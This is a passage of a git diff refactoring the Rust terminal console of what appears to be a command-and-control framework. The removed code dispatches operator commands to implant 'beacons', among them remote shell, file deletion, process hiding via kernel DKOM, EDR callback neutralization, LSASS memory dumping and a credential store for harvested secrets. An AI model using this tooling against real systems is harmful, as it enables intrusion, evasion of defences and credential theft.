                 KeyCode::Char('K') => {
-                    self.pane_tree.adjust_ratio(self.focused_pane, 0.05);
+                    self.panes.tree.adjust_ratio(self.panes.focused, 0.05);
                     return;
                 }
                 KeyCode::Char('J') => {
-                    self.pane_tree.adjust_ratio(self.focused_pane, -0.05);
+                    self.panes.tree.adjust_ratio(self.panes.focused, -0.05);
                     return;
                 }
                 _ => {
@@ -745,22 +657,22 @@ impl App {
         // Scroll keys (work even while typing).
         match key.code {
             KeyCode::PageUp => {
-                let off = self.pane_scroll.entry(self.focused_pane).or_insert(0);
+                let off = self.panes.scroll.entry(self.panes.focused).or_insert(0);
                 *off = off.saturating_add(10);
                 return;
             }
             KeyCode::PageDown => {
-                let off = self.pane_scroll.entry(self.focused_pane).or_insert(0);
+                let off = self.panes.scroll.entry(self.panes.focused).or_insert(0);
                 *off = off.saturating_sub(10);
                 return;
             }
             KeyCode::Up if key.modifiers.contains(KeyModifiers::ALT) => {
-                let off = self.pane_scroll.entry(self.focused_pane).or_insert(0);
+                let off = self.panes.scroll.entry(self.panes.focused).or_insert(0);
                 *off = off.saturating_add(1);
                 return;
             }
             KeyCode::Down if key.modifiers.contains(KeyModifiers::ALT) => {
-                let off = self.pane_scroll.entry(self.focused_pane).or_insert(0);
+                let off = self.panes.scroll.entry(self.panes.focused).or_insert(0);
                 *off = off.saturating_sub(1);
                 return;
             }
@@ -827,17 +739,17 @@ impl App {
             }
             KeyCode::Up => {
                 // input history navigation
-                if !self.history.is_empty() {
+                if !self.input.history.is_empty() {
                     // 先用不可变借用算出 idx + 拷出历史条目，释放 borrow 后
-                    // 再拿 focused_state_mut，避免 self.history 与 self.pane_tree
+                    // 再拿 focused_state_mut，避免 self.input.history 与 self.panes.tree
                     // 同时被借的冲突。
                     let (idx, entry) = {
                         let st = self.focused_state();
                         let idx = match st.hist_idx {
                             Some(i) => i.saturating_sub(1),
-                            None => self.history.len() - 1,
+                            None => self.input.history.len() - 1,
                         };
-                        (idx, self.history[idx].clone())
+                        (idx, self.input.history[idx].clone())
                     };
                     let st = self.focused_state_mut();
                     st.hist_idx = Some(idx);
@@ -852,8 +764,8 @@ impl App {
                     match st.hist_idx {
                         Some(i) => {
                             let next = i + 1;
-                            if next < self.history.len() {
-                                Some(HistoryNav::Pick(self.history[next].clone()))
+                            if next < self.input.history.len() {
+                                Some(HistoryNav::Pick(self.input.history[next].clone()))
                             } else {
                                 Some(HistoryNav::Clear)
                             }
@@ -921,98 +833,6 @@ impl App {
         }
     }
 
-    fn handle_overlay_key(&mut self, key: KeyEvent) {
-        // overlay 滚动页大小：取 overlay 可视高度的合理估值（与 render 的 inner
-        // 高度一致：focused_pane_rect 去掉边框 2 + block padding）。最少 1。
-        let page = self.focused_pane_rect.height.saturating_sub(4).max(1) as usize;
-        match &mut self.overlay {
-            Overlay::Sessions(state) => match key.code {
-                KeyCode::Char('j') | KeyCode::Down => {
-                    let i = state.selected().unwrap_or(0);
-                    if i + 1 < self.sessions.len() {
-                        state.select(Some(i + 1));
-                    }
-                }
-                KeyCode::Char('k') | KeyCode::Up => {
-                    let i = state.selected().unwrap_or(0);
-                    state.select(Some(i.saturating_sub(1)));
-                }
-                // PgUp/PgDn 滚动 Sessions 列表（↑/↓ 保留给选区导航）。
-                // overlay_scroll 顶部锚定（0=顶）：PgUp 向顶（减），PgDn 向底（加）。
-                KeyCode::PageUp => self.overlay_scroll = self.overlay_scroll.saturating_sub(page),
-                KeyCode::PageDown => self.overlay_scroll = self.overlay_scroll.saturating_add(page),
-                KeyCode::Enter => {
-                    if let Some(i) = state.selected() {
-                        if let Some(s) = self.sessions.get(i) {
-                            self.pane_tree
-                                .set_session_id(self.focused_pane, Some(s.id.clone()));
-                        }
-                        if let Some(s) = self.sessions.get(i) {
-                            self.log(&format!("selected beacon {}", short(&s.id)), Level::Ok);
-                        }
-                    }
-                    self.overlay = Overlay::None;
-                }
-                KeyCode::Char('q') | KeyCode::Esc => self.overlay = Overlay::None,
-                _ => {}
-            },
-            Overlay::None => {}
-            _ => match key.code {
-                // 表格 overlay（Files/Procs/Creds/Audit/Tasks…）：↑/↓/PgUp/PgDn 滚动。
-                // overlay_scroll 顶部锚定（0=顶）：↑/PgUp 向顶（减），↓/PgDn 向底（加）。
-                // overlay_scroll 可超 max_scroll，render 会 clamp；上滚 saturating 到 0。
-                KeyCode::PageUp | KeyCode::Up => {
-                    self.overlay_scroll = self
-                        .overlay_scroll
-                        .saturating_sub(if key.code == KeyCode::PageUp { page } else { 1 });
-                }
-                KeyCode::PageDown | KeyCode::Down => {
-                    self.overlay_scroll =
-                        self.overlay_scroll
-                            .saturating_add(if key.code == KeyCode::PageDown {
-                                page
-                            } else {
-                                1
-                            });
-                }
-                KeyCode::Char('q') | KeyCode::Esc => self.overlay = Overlay::None,
-                _ => {}
-            },
-        }
-    }
-
-    /// 搜索输入态的按键处理。Esc/Enter 退出输入态（Enter 落到 search_query，
-    /// Esc 清空过滤）；其余字符追加到缓冲；Backspace 删尾。
-    fn handle_search_key(&mut self, key: KeyEvent) {
-        let input = match self.search_input.as_mut() {
-            Some(i) => i,
-            None => return,
-        };
-        match key.code {
-            KeyCode::Esc => {
-                // 退出搜索：清空过滤 + 输入缓冲，回到全量显示。
-                self.search_input = None;
-                self.search_query = None;
-            }
-            KeyCode::Enter => {
-                // 提交：落到 search_query（空串视为不过滤）。仍留在过滤态但退出
-                // 输入态——Esc 才彻底清空。
-                let q = std::mem::take(input);
-                self.search_input = None;
-                self.search_query = if q.trim().is_empty() { None } else { Some(q) };
-            }
-            KeyCode::Backspace => {
-                input.pop();
-            }
-            KeyCode::Char(c) if !key.modifiers.contains(KeyModifiers::CONTROL) => {
-                // Ctrl 组合键已在 handle_key 顶部拦截（仅 Ctrl+C 退出），这里只收
-                // 裸字符。
-                input.push(c);
-            }
-            _ => {}
-        }
-    }
-
     /// Handle a mouse event. opencode 风格全套鼠标操作：
     /// - 滚轮：滚动焦点窗格内容（原有）
     /// - 左键单击：聚焦窗格 / 点 tab 切视图 / 点 overlay 行选择
@@ -1022,14 +842,14 @@ impl App {
     fn handle_mouse(&mut self, ev: MouseEvent) {
         // 确认 overlay 开着时吞掉所有鼠标事件：模态对话框期间不允许点背后
         // 的窗格（避免误操作 / 焦点漂移）。操作员必须用键盘 y/n/Esc 回应。
-        if self.confirm_action.is_some() {
+        if self.ovl.confirm.is_some() {
             return;
         }
         // 先更新 hover：鼠标在哪格上方。render 用它做 hover 高亮。
         if let Some(id) = self.pane_at(ev.row, ev.column) {
-            self.hover_pane = Some(id);
+            self.panes.hover = Some(id);
         } else {
-            self.hover_pane = None;
+            self.panes.hover = None;
         }
         match ev.kind {
             // Wheel / touchpad vertical scroll.
@@ -1061,7 +881,7 @@ impl App {
     /// 查屏幕坐标落在哪个窗格里。返回该叶 id，或 None（点击在窗格区外）。
     /// 供右键/中键/hover 共用，避免每个事件都重算 layout。
     fn pane_at(&self, row: u16, col: u16) -> Option<usize> {
-        let full = self.last_frame_size;
+        let full = self.panes.last_frame;
         if full.height < 8 {
             return None;
         }
@@ -1071,7 +891,7 @@ impl App {
             width: full.width,
             height: full.height.saturating_sub(1 + 3),
         };
-        let layouts = self.pane_tree.layout(pane_area);
+        let layouts = self.panes.tree.layout(pane_area);
         layouts.iter().find_map(|(id, r)| {
             (col >= r.x && col < r.x + r.width && row >= r.y && row < r.y + r.height).then_some(*id)
         })
@@ -1079,23 +899,23 @@ impl App {
 
     /// 关闭指定窗格（鼠标右键等价 prefix+x）。复用 close 的焦点回退逻辑。
     fn close_pane(&mut self, target: usize) {
-        if self.pane_tree.leaf_count() <= 1 {
+        if self.panes.tree.leaf_count() <= 1 {
             return; // 不关最后一个
         }
-        let full = self.last_frame_size;
+        let full = self.panes.last_frame;
         let pane_area = ratatui::layout::Rect {
             x: full.x,
             y: full.y + 1,
             width: full.width,
             height: full.height.saturating_sub(1 + 3),
         };
-        let before = self.pane_tree.layout(pane_area);
+        let before = self.panes.tree.layout(pane_area);
         let closed_rect = before.iter().find(|(id, _)| *id == target).map(|(_, r)| *r);
-        self.pane_tree = self.pane_tree.clone().close(target);
-        self.pane_scroll.remove(&target);
-        let remaining = self.pane_tree.layout(pane_area);
-        self.focused_pane = pick_nearest_leaf(&remaining, closed_rect).unwrap_or_else(|| {
-            self.pane_tree
+        self.panes.tree = self.panes.tree.clone().close(target);
+        self.panes.scroll.remove(&target);
+        let remaining = self.panes.tree.layout(pane_area);
+        self.panes.focused = pick_nearest_leaf(&remaining, closed_rect).unwrap_or_else(|| {
+            self.panes.tree
                 .leaves()
                 .first()
                 .map(|(id, _)| *id)
@@ -1105,15 +925,15 @@ impl App {
 
     /// 在指定窗格处分屏。鼠标中键的快捷操作。
     fn split_pane(&mut self, target: usize, dir: panes::SplitDir) {
-        let new_id = self.pane_tree.next_id();
-        self.pane_tree = self.pane_tree.clone().split(target, dir, new_id);
-        self.focused_pane = new_id;
+        let new_id = self.panes.tree.next_id();
+        self.panes.tree = self.panes.tree.clone().split(target, dir, new_id);
+        self.panes.focused = new_id;
     }
 
     /// Move the active scroll surface by `amount` lines in `dir`.
     fn scroll(&mut self, dir: ScrollDir, amount: usize) {
         // 鼠标滚轮滚动焦点 Console 窗格（或全局 stream）。
-        let off = self.pane_scroll.entry(self.focused_pane).or_insert(0);
+        let off = self.panes.scroll.entry(self.panes.focused).or_insert(0);
         *off = apply_scroll(*off, dir, amount);
         // 同步全局 stream_offset 保持旧逻辑兼容。
         self.stream_offset = *off;
@@ -1127,18 +947,18 @@ impl App {
     fn click(&mut self, row: u16, col: u16) {
         // Sessions overlay：用 session_row_rects 精确命中（render 记录的每行 Rect）。
         // 不再用算术推算——List widget 滚动偏移会让 row→idx 映射失效。
-        if let Overlay::Sessions(state) = &mut self.overlay {
+        if let Overlay::Sessions(state) = &mut self.ovl.overlay {
             // 用上一帧 render 记录的 hit regions 查命中。元组带全局 session 索引，
             // 所以即便 overlay 滚动了，点击仍能映射到正确的 session。
-            for (r, i) in self.session_row_rects.iter() {
+            for (r, i) in self.panes.overlay_rows.iter() {
                 if row >= r.y && row < r.y + r.height && col >= r.x && col < r.x + r.width {
                     state.select(Some(*i));
-                    if let Some(s) = self.sessions.get(*i) {
-                        self.pane_tree
-                            .set_session_id(self.focused_pane, Some(s.id.clone()));
-                        self.log(&format!("selected beacon {}", short(&s.id)), Level::Ok);
+                    if let Some(s) = self.sess.list.get(*i) {
+                        self.panes.tree
+                            .set_session_id(self.panes.focused, Some(s.id.clone()));
+                        self.log(&format!("selected session {}", short(&s.id)), Level::Ok);
                     }
-                    self.overlay = Overlay::None;
+                    self.ovl.overlay = Overlay::None;
                     return;
                 }
             }
@@ -1146,13 +966,13 @@ impl App {
         }
         // 无 overlay → 点击聚焦窗格。用与 render 一致的布局算 pane_area：
         // 顶部 statusbar 1 行 + 底部 input 3 行，中间是窗格区。
-        let full = self.last_frame_size;
+        let full = self.panes.last_frame;
         if full.height < 8 {
             return; // 太小不处理（render 也走了 too-small 分支）
         }
         // 优先处理 view picker：若开着且点击落在它上面 → 选对应行视图并关闭。
-        if let Some((picker_pane, _)) = &self.view_picker {
-            if let Some(tab_rect) = self.view_tab_rect.get(picker_pane).copied() {
+        if let Some((picker_pane, _)) = &self.panes.picker {
+            if let Some(tab_rect) = self.panes.tab_rects.get(picker_pane).copied() {
                 let count = panes::PaneView::ALL.len();
                 // picker 区域：tab 下方，每行 1 个视图，从 tab_rect.y+2 开始
                 // （+1 进窗格内容区，+1 跳边框标题）。宽度固定 14（与 render 一致）。
@@ -1165,9 +985,9 @@ impl App {
                 {
                     let idx = (row - picker_top) as usize;
                     if let Some(v) = panes::PaneView::ALL.get(idx).copied() {
-                        self.pane_tree = self.pane_tree.clone().set_view(*picker_pane, v);
+                        self.panes.tree = self.panes.tree.clone().set_view(*picker_pane, v);
                     }
-                    self.view_picker = None;
+                    self.panes.picker = None;
                     return;
                 }
             }
@@ -1182,7 +1002,7 @@ impl App {
             height: full.height.saturating_sub(1 + 3), // statusbar + input
         };
         // 反查点击坐标落在哪个叶的 rect 里。
-        let layouts = self.pane_tree.layout(pane_area);
+        let layouts = self.panes.tree.layout(pane_area);
         for (id, rect) in &layouts {
             if col >= rect.x
                 && col < rect.x + rect.width
@@ -1190,21 +1010,20 @@ impl App {
                 && row < rect.y + rect.height
             {
                 // 先聚焦该窗格（点哪聚焦哪）。
-                if *id != self.focused_pane {
-                    self.focused_pane = *id;
+                if *id != self.panes.focused {
+                    self.panes.focused = *id;
                 }
                 // 点中窗格后，检查是否点中了它的视图 tab（顶部边框行）。
                 // 命中 → 开关该窗格的 view picker（而非直接切视图）。
-                if let Some(tab_rect) = self.view_tab_rect.get(id).copied() {
+                if let Some(tab_rect) = self.panes.tab_rects.get(id).copied() {
                     if col >= tab_rect.x && col < tab_rect.x + tab_rect.width && row == tab_rect.y {
                         // toggle picker：已开则关，没开则开（初始选中当前视图）。
-                        if self.view_picker.as_ref().is_some_and(|(pid, _)| pid == id) {
-                            self.view_picker = None;
+                        if self.panes.picker.as_ref().is_some_and(|(pid, _)| pid == id) {
+                            self.panes.picker = None;
                         } else {
                             let mut st = ratatui::widgets::ListState::default();
                             // 初始选中当前视图对应行。
-                            if let Some(cur) = self
-                                .pane_tree
+                            if let Some(cur) = self.panes.tree
                                 .leaves()
                                 .iter()
                                 .find(|(lid, _)| lid == id)
@@ -1212,19 +1031,19 @@ impl App {
                             {
                                 st.select(panes::PaneView::ALL.iter().position(|v| *v == cur));
                             }
-                            self.view_picker = Some((*id, st));
+                            self.panes.picker = Some((*id, st));
                         }
                         return;
                     }
                 }
                 // 点在窗格内容区（非 tab）。
                 // 若该窗格是 SessionList 视图，检查是否点中了某 session 行 → 切换 beacon。
-                if let Some(rows) = self.pane_session_rows.get(id) {
+                if let Some(rows) = self.panes.list_rows.get(id) {
                     for (r, sid) in rows {
                         if col >= r.x && col < r.x + r.width && row >= r.y && row < r.y + r.height {
-                            self.pane_tree.set_session_id(*id, Some(sid.clone()));
+                            self.panes.tree.set_session_id(*id, Some(sid.clone()));
                             self.log(
-                                &format!("[pane {}] selected beacon {}", id, short(sid)),
+                                &format!("[pane {}] selected session {}", id, short(sid)),
                                 Level::Ok,
                             );
                             return;
@@ -1232,1511 +1051,12 @@ impl App {
                     }
                 }
                 // 点在内容区非 session 行 → 关掉任何开着的 picker。
-                self.view_picker = None;
+                self.panes.picker = None;
                 return;
             }
         }
     }
 
-    fn submit(&mut self) {
-        // 从焦点窗格取出输入，避免动到其他窗格的 input/cursor/popup。
-        let raw = {
-            let st = self.focused_state_mut();
-            let r = std::mem::take(&mut st.input);
-            st.cursor = 0;
-            st.popup_open = false;
-            st.hist_idx = None;
-            r
-        };
-        if !raw.trim().is_empty() {
-            self.history.push(raw.clone());
-            // Cap history to prevent unbounded growth（P1-1c），与 STREAM_CAP 对称。
-            if self.history.len() > HISTORY_CAP {
-                let drop = self.history.len() - HISTORY_CAP;
-                self.history.drain(..drop);
-            }
-        }
-        // 破坏性命令确认拦截：/kill /rm /hide /neutralize /dump-lsass。
-        // 拦截只发生在操作员新输入时；确认后走 dispatch_confirmed 直接派发，
-        // 不再回到 submit，所以无需 bypass flag。
-        if self.confirm_action.is_none() {
-            if let Some(desc) = destructive_confirm(&raw) {
-                self.confirm_action = Some(ConfirmAction {
-                    cmd: raw.clone(),
-                    description: self.build_confirm_description(&raw, desc),
-                });
-                return; // 等待 y/N，不派发
-            }
-        }
-        self.dispatch_line(&raw);
-    }
-
-    /// Classify + dispatch a typed line, with no confirmation gating.
-    ///
-    /// Shared by [`submit`] (normal input) and the confirm-overlay `y` handler
-    /// (re-dispatch of the stored destructive command). Keeping it separate
-    /// means confirmation re-dispatch doesn't re-push history or re-trigger
-    /// the intercept — the stored `cmd` already lives in history from the
-    /// original `submit`.
-    fn dispatch_line(&mut self, raw: &str) {
-        match input::classify_with(raw, &self.config.aliases) {
-            Input::Empty => {}
-            Input::Shell(cmd) => self.run_shell(&cmd),
-            Input::Meta { name, args } => self.run_meta(&name, &args),
-        }
-    }
-
-    /// Confirm-overlay key handling. Returns true if the key was consumed
-    /// (so the caller can short-circuit before any other key routing).
-    ///
-    /// `y` → re-dispatch the stored command via [`dispatch_line`] (bypasses
-    ///   the intercept and history, since it's already there from the first
-    ///   submit); `n`/`Esc` → cancel; anything else → ignored (must explicitly
-    ///   confirm or deny).
-    fn handle_confirm_key(&mut self, key: KeyEvent) -> bool {
-        let action = match self.confirm_action.take() {
-            Some(a) => a,
-            None => return false,
-        };
-        match key.code {
-            KeyCode::Char('y') => {
-                // 重派发存的原命令。不进 submit（避免重复 history + 再拦截）。
-                self.dispatch_line(&action.cmd);
-                self.confirm_action = None;
-                true
-            }
-            KeyCode::Char('n') | KeyCode::Esc => {
-                self.log("cancelled", Level::Info);
-                self.toast("cancelled", Level::Warn);
-                self.confirm_action = None;
-                true
-            }
-            _ => {
-                // 未确认也未取消：把 action 放回去，继续等。
-                self.confirm_action = Some(action);
-                true // 仍吞掉该键（必须显式 y/n/Esc）
-            }
-        }
-    }
-
-    /// 构造破坏性命令的确认提示语。`generic` 是来自 [`DESTRUCTIVE_COMMANDS`]
-    /// 的通用描述；这里按命令补充上下文（beacon id / 目标路径 / pid），让
-    /// 操作员在 y 之前看到具体影响对象。
-    ///
-    /// 退化情况（无选中 beacon、解析失败）只回退到 generic 文案，不阻断确认流程。
-    fn build_confirm_description(&self, raw: &str, generic: &str) -> String {
-        let trimmed = raw.trim();
-        let (cmd, rest) = match trimmed.split_once(char::is_whitespace) {
-            Some((c, r)) => (c.to_ascii_lowercase(), r.trim()),
-            None => (trimmed.to_ascii_lowercase(), ""),
-        };
-        match cmd.as_str() {
-            "/kill" => {
-                let sid = self
-                    .current_session()
-                    .map(|s| short(&s.id))
-                    .unwrap_or_default();
-                format!("Kill beacon session {sid}? The implant will exit.")
-            }
-            "/rm" => {
-                let path = rest.split_whitespace().next().unwrap_or("<path>");
-                format!("Delete file {path} on the target? {generic}")
-            }
-            "/hide" => {
-                let pid = rest.split_whitespace().next().unwrap_or("<pid>");
-                format!("Hide process {pid} via kernel DKOM? {generic}")
-            }
-            "/neutralize" => {
-                let pid = rest.split_whitespace().next().unwrap_or("<pid>");
-                format!("Neutralize EDR callbacks for {pid}? {generic}")
-            }
-            "/dump-lsass" => {
-                let pid = rest.split_whitespace().next().unwrap_or("<pid>");
-                format!("Dump LSASS memory for pid {pid}? {generic}")
-            }
-            _ => generic.to_string(),
-        }
-    }
-
-    fn run_shell(&mut self, cmd: &str) {
-        let Some(s) = self.current_session().cloned() else {
-            self.log(
-                "! no beacon selected — use /use <id> or /sessions",
-                Level::Err,
-            );
-            self.toast("! no beacon selected", Level::Err);
-            return;
-        };
-        self.log(&format!("[{}] $ {}", short(&s.id), cmd), Level::Info);
-        self.send(Cmd::Shell {
-            session: s.id,
-            args: cmd.to_string(),
-            parse: ParseAs::None,
-        });
-    }
-
-    fn run_meta(&mut self, name: &str, args: &str) {
-        match name {
-            "/help" => {
-                for m in META_COMMANDS {
-                    self.log(
-                        &format!("{:14} {:18} {}", m.name, m.args_hint, m.help),
-                        Level::Info,
-                    );
-                }
-            }
-            "/clear" => self.stream.clear(),
-            "/config" => {
-                // /config                     — 显示当前可调运行时参数
-                // /config stream_cap <N>      — 改事件流上限，改小立即裁剪
-                let mut parts = args.split_whitespace();
-                match parts.next() {
-                    Some("stream_cap") => {
-                        let n = match parts.next().and_then(|x| x.parse::<usize>().ok()) {
-                            Some(v) => v,
-                            None => {
-                                self.log("usage: /config stream_cap <N>", Level::Warn);
-                                return;
-                            }
-                        };
-                        if n == 0 {
-                            self.log("! stream_cap must be > 0", Level::Warn);
-                            return;
-                        }
-                        let old = self.stream_cap;
-                        self.stream_cap = n;
-                        self.trim_stream();
-                        self.log(
-                            &format!("stream_cap: {old} → {n} (stream now {})", self.stream.len()),
-                            Level::Ok,
-                        );
-                    }
-                    Some(other) => self.log(
-                        &format!("! /config: unknown key '{other}' (stream_cap)"),
-                        Level::Err,
-                    ),
-                    None => self.log(
-                        &format!(
-                            "config: stream_cap={} (stream={}/{})",
-                            self.stream_cap,
-                            self.stream.len(),
-                            self.stream_cap
-                        ),
-                        Level::Info,
-                    ),
-                }
-            }
-            "/theme" => {
-                // /theme               — 显示当前主题
-                // /theme mocha         — Catppuccin Mocha（默认）
-                // /theme frappe        — Catppuccin Frappé（medium-dark）
-                // /theme macchiato     — Catppuccin Macchiato
-                // /theme highcontrast  — WCAG AAA 高对比度
-                // /theme nocolor       — 无色（遵守 NO_COLOR）
-                let sub = args.trim();
-                if sub.is_empty() {
-                    self.log(
-                        &format!(
-                            "current theme: {} (options: mocha, frappe, macchiato, highcontrast, nocolor)",
-                            self.config.theme
-                        ),
-                        Level::Info,
-                    );
-                } else {
-                    let valid = matches!(
-                        sub.to_ascii_lowercase().as_str(),
-                        "mocha" | "frappe" | "macchiato" | "highcontrast" | "hc" | "nocolor"
-                    );
-                    if !valid {
-                        self.log(
-                            &format!("! unknown theme '{sub}' (mocha | frappe | macchiato | highcontrast | nocolor)"),
-                            Level::Warn,
-                        );
-                        return;
-                    }
-                    // 热切换调色板（RwLock 写入，立即生效，下一帧渲染就用新色）。
-                    crate::theme::switch(sub);
-                    // 持久化到配置文件，下次启动生效。
-                    self.config.theme = sub.to_string();
-                    match self.config.save() {
-                        Ok(()) => self.log(&format!("theme switched to {sub}"), Level::Ok),
-                        Err(e) => {
-                            self.log(&format!("theme switched but save failed: {e}"), Level::Warn)
-                        }
-                    }
-                }
-            }
-            "/alias" => {
-                // /alias add <name> <command...>  /  /alias rm <name>  /  /alias list
-                let mut parts = args.split_whitespace();
-                match parts.next() {
-                    Some("add") => {
-                        let name = match parts.next() {
-                            Some(n) => n.to_string(),
-                            None => {
-                                self.log("usage: /alias add <name> <command...>", Level::Warn);
-                                return;
-                            }
-                        };
-                        let cmd: String = parts.collect::<Vec<_>>().join(" ");
-                        if cmd.is_empty() {
-                            self.log("usage: /alias add <name> <command...>", Level::Warn);
-                            return;
-                        }
-                        self.config.set_alias(&name, &cmd);
-                        match self.config.save() {
-                            Ok(()) => self.log(&format!("alias {name} = {cmd}"), Level::Ok),
-                            Err(e) => self.log(&format!("! save alias: {e}"), Level::Err),
-                        }
-                    }
-                    Some("rm") | Some("del") | Some("remove") => {
-                        let name = match parts.next() {
-                            Some(n) => n.to_string(),
-                            None => {
-                                self.log("usage: /alias rm <name>", Level::Warn);
-                                return;
-                            }
-                        };
-                        if self.config.del_alias(&name) {
-                            let _ = self.config.save();
-                            self.log(&format!("removed alias {name}"), Level::Ok);
-                        } else {
-                            self.log(&format!("! no alias named {name}"), Level::Warn);
-                        }
-                    }
-                    Some("list") | None => {
-                        if self.config.aliases.is_empty() {
-                            self.log("(no aliases)", Level::Warn);
-                        } else {
-                            let pairs: Vec<(String, String)> = self
-                                .config
-                                .aliases
-                                .iter()
-                                .map(|(n, c)| (n.clone(), c.clone()))
-                                .collect();
-                            for (n, c) in &pairs {
-                                self.log(&format!("  {n} = {c}"), Level::Info);
-                            }
-                        }
-                    }
-                    Some(other) => self.log(
-                        &format!("! /alias: unknown subcommand '{other}' (add/rm/list)"),
-                        Level::Err,
-                    ),
-                }
-            }
-            "/topo" => {
-                // 用拓扑布局算法画 session 关系图。
-                let nodes: Vec<(String, String)> = self
-                    .sessions
-                    .iter()
-                    .map(|s| {
-                        let label = self
-                            .sessions_meta
-                            .get(&s.id)
-                            .alias
-                            .clone()
-                            .unwrap_or_else(|| s.hostname.clone());
-                        (s.id.clone(), label)
-                    })
-                    .collect();
-                let topo = topology::layout(&nodes, &[]);
-                if topo.nodes.is_empty() {
-                    self.log("(no beacons to graph)", Level::Warn);
-                } else {
-                    self.log(
-                        &format!(
-                            "╔══ topology: {} nodes, {} edges ═══",
-                            topo.nodes.len(),
-                            topo.edges.len()
-                        ),
-                        Level::Info,
-                    );
-                    // 按层分组渲染 ASCII 树
-                    let max_y = topo.nodes.iter().map(|n| n.y).max().unwrap_or(0);
-                    for layer in 0..=max_y {
-                        let layer_nodes: Vec<&topology::TopoNode> =
-                            topo.nodes.iter().filter(|n| n.y == layer).collect();
-                        if layer_nodes.is_empty() {
-                            continue;
-                        }
-                        // 层标签
-                        if layer == 0 {
-                            self.log("║", Level::Info);
-                        }
-                        // 节点行
-                        let node_strs: Vec<String> = layer_nodes
-                            .iter()
-                            .map(|n| {
-                                // ●/○ 与连接状态点统一（render_statusbar），填充=活跃。
-                                let mark = if n.is_beacon { "●" } else { "○" };
-                                let star = if self.sessions_meta.get(&n.id).favorite {
-                                    " ★"
-                                } else {
-                                    ""
-                                };
-                                format!("{mark} {}{star}", n.label)
-                            })
-                            .collect();
-                        self.log(
-                            &format!("║  L{}  {}", layer, node_strs.join("  ──→  ")),
-                            Level::Info,
-                        );
-                        // 连接线（非最后一层）
-                        if layer < max_y {
-                            self.log("║  │", Level::Info);
-                        }
-                    }
-                    // 边列表
-                    if !topo.edges.is_empty() {
-                        self.log("║", Level::Info);
-                        self.log("║  edges:", Level::Info);
-                        for e in &topo.edges {
-                            self.log(
-                                &format!(
-                                    "║    {} ─{}→ {}",
-                                    short_topo(&topo, &e.from),
-                                    e.label,
-                                    short_topo(&topo, &e.to)
-                                ),
-                                Level::Info,
-                            );
-                        }
-                    }
-                    self.log("╚══════════════════════════════", Level::Info);
-                }
-            }
-            "/creds" => {
-                // /creds                 — 列出整个凭据库
-                // /creds export json|csv — 导出
-                // /creds find <query>    — 搜索（kind:hash / user:admin）
-                // /creds sync [reveal]   — 从 server /api/creds 拉取并入库
-                // /creds <shell cmd>     — 跑 shell dump，结果解析后入库
-                let sub = args.trim();
-                if sub == "export json" {
-                    self.log(&self.creds.export_json(), Level::Info);
-                } else if sub == "export csv" {
-                    self.log(&self.creds.export_csv(), Level::Info);
-                } else if let Some(query) = sub.strip_prefix("find ") {
-                    // 搜索凭据库
-                    let hits = self.creds.search(query.trim());
-                    if hits.is_empty() {
-                        self.log(&format!("(no creds match '{query}')"), Level::Warn);
-                    } else {
-                        let rows: Vec<CredEntry> = hits
-                            .iter()
-                            .map(|c| CredEntry {
-                                source: c.source.clone(),
-                                principal: c.principal.clone(),
-                                kind: c.kind,
-                                secret: c.secret.clone(),
-                            })
-                            .collect();
-                        self.log(&format!("{} match(es)", rows.len()), Level::Ok);
-                        self.overlay = Overlay::Creds(rows);
-                        self.overlay_scroll = 0;
-                    }
-                } else if sub == "list" || sub.is_empty() {
-                    if self.creds.entries.is_empty() {
-                        self.log(
-                            "(credstore empty — run a cred dump BOF or /creds sync first)",
-                            Level::Warn,
-                        );
-                    } else {
-                        let rows: Vec<CredEntry> = self
-                            .creds
-                            .entries
-                            .iter()
-                            .map(|c| CredEntry {
-                                source: c.source.clone(),
-                                principal: c.principal.clone(),
-                                kind: c.kind,
-                                secret: c.secret.clone(),
-                            })
-                            .collect();
-                        self.overlay = Overlay::Creds(rows);
-                        self.overlay_scroll = 0;
-                    }
-                } else if sub.starts_with("add ") {
-                    let mut parts = sub.split_whitespace().skip(1);
-                    let realm = parts.next().unwrap_or("").to_string();
-                    let user = parts.next().unwrap_or("").to_string();
-                    let kind = parts.next().unwrap_or("").to_string();
-                    let secret = parts.next().unwrap_or("").to_string();
-                    if realm.is_empty() || user.is_empty() || kind.is_empty() || secret.is_empty() {
-                        self.log(
-                            "usage: /creds add <realm> <user> <kind> <secret>",
-                            Level::Warn,
-                        );
-                        return;
-                    }
-                    self.send(crate::rest::Cmd::AddCred {
-                        realm,
-                        user,
-                        kind,
-                        secret,
-                    });
-                } else if sub.starts_with("del ") {
-                    let mut parts = sub.split_whitespace().skip(1);
-                    let realm = parts.next().unwrap_or("").to_string();
-                    let user = parts.next().unwrap_or("").to_string();
-                    let kind = parts.next().unwrap_or("").to_string();
-                    if realm.is_empty() || user.is_empty() || kind.is_empty() {
-                        self.log("usage: /creds del <realm> <user> <kind>", Level::Warn);
-                        return;
-                    }
-                    self.send(crate::rest::Cmd::DelCred { realm, user, kind });
-                } else if sub == "sync" || sub.starts_with("sync ") {
-                    let reveal = sub.contains("reveal");
-                    self.send(Cmd::FetchCreds { reveal });
-                } else {
-                    // 当作 shell 命令跑，结果解析后入库
-                    self.run_parsed_shell(sub, "/creds", ShellFor::Creds);
-                }
-            }
-            "/profile" => {
-                self.send(crate::rest::Cmd::FetchProfile);
-            }
-            "/chan" => {
-                let mut parts = args.split_whitespace();
-                let sub = match parts.next() {
-                    Some(s) => s,
-                    None => {
-                        self.log("usage: /chan close <id>", Level::Warn);
-                        return;
-                    }
-                };
-                if sub == "close" {
-                    let chan: u32 = match parts.next().and_then(|x| x.parse().ok()) {
-                        Some(c) => c,
-                        None => {
-                            self.log("usage: /chan close <id>", Level::Warn);
-                            return;
-                        }
-                    };
-                    self.send(crate::rest::Cmd::CloseChan { chan });
-                } else {
-                    self.log(
-                        &format!("! /chan: unknown subcommand '{sub}' (close)"),
-                        Level::Err,
-                    );
-                }
-            }
-            "/audit" => {
-                let sub = args.trim();
-                if sub == "verify" {
-                    self.send(crate::rest::Cmd::VerifyAudit);
-                    return;
-                }
-                // /audit                       — 全量审计日志
-                // /audit operator <name>       — 按操作员过滤
-                // /audit action <task|cred_*>  — 按动作过滤
-                // /audit limit <n>             — 限制条数
-                let mut filters: Option<String> = None;
-                let mut operator: Option<String> = None;
-                let mut action: Option<String> = None;
-                let mut limit: Option<u32> = None;
-                let mut it = args.split_whitespace();
-                while let Some(k) = it.next() {
-                    match k {
-                        "operator" => operator = it.next().map(|s| s.to_string()),
-                        "action" => action = it.next().map(|s| s.to_string()),
-                        "limit" => limit = it.next().and_then(|s| s.parse().ok()),
-                        _ => {
